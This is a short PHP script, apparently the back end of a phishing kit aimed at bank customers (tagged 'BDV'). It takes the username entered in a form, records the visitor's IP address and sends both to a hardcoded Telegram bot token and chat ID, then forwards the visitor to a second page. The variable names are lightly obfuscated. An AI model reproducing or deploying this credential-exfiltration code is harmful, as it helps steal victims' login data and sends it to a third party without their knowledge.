<?php

// Recoger los datos del formulario
$malta = $_POST['nombre'];


// Función para obtener la IP real del usuario, incluso si está detrás de un proxy
function obtener_ip_real() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_lista = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ip_lista[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Obtener la IP real
$direccixn_ip = obtener_ip_real();

// API key del chatbot de Telegram
$bxt_axi_kxy = '7787071734:AAGET4_aAQIuSUwwD9q3a-Rm31fArHn6F2Q';

// ID del chat al que se enviará el mensaje
$chxt_xd = '-4568985163';

// Mensaje que se enviará al chatbot
$mensaje_para_chxtbxt = "BDV-\n" . "Usuario: " . $malta .  "\nIP: " . $direccixn_ip;

// URL de la API de Telegram para enviar mensajes
$telegram_url = "https://api.telegram.org/bot" . $bxt_axi_kxy . "/sendMessage?chat_id=" . $chxt_xd . "&text=" . urlencode($mensaje_para_chxtbxt);

// Enviar el mensaje al chatbot de Telegram
$response = file_get_contents($telegram_url);

// Redirigir a index.php
header("Location: index2.html");
exit;

?>